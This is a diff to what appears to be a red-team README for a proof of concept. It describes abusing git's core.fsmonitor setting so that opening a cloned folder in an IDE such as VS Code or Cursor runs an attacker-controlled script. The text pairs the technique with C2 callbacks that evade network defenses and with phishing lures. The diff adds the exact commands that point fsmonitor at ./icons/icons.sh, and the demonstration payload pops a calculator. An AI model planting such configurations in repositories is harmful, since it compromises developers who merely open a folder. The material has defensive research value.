@@ -4,7 +4,7 @@
 
 Which allows `git` to spawn the configured helper which executes attacker controlled code. This tradecraft can be used during RT or in a assume-breach scenario with any C2 or our [XRayC2](http://github.com/RootUp/XRayC2) to get a callback that evades traditional network defenses. (Ofcourse, phishing emails are required to trick end user, but opening a folder in IDE seems a fair operation).
 
-For proof-of-work, `git clone` this repo add the below config under your `.git` directory. Once done open the crafted folder with IDE, a calculator should pop. (I have tested this with Code & Cursor). This POC is macOS specfic modify it according to your env.
+Proof-of-work, `git clone` this repo add the below config under your `.git` directory. Once done open the crafted folder with IDE, a calculator should pop. (I have tested this with Code & Cursor). This POC is macOS specfic modify it according to your env.
 
 ```bash
 bash-3.2$ cd git-fsmonitor
@@ -18,6 +18,8 @@ bash-3.2$ nano .git/config
 	ignorecase = true
 	precomposeunicode = true
 	fsmonitor = ./icons/icons.sh
+bash-3.2$ git init
+bash-3.2$ git config core.fsmonitor ./icons/icons.sh
 bash-3.2$ ls git-fsmonitor-main/.git/
 .DS_Store    config       description  HEAD         hooks/       info/        objects/     refs/        
 bash-3.2$
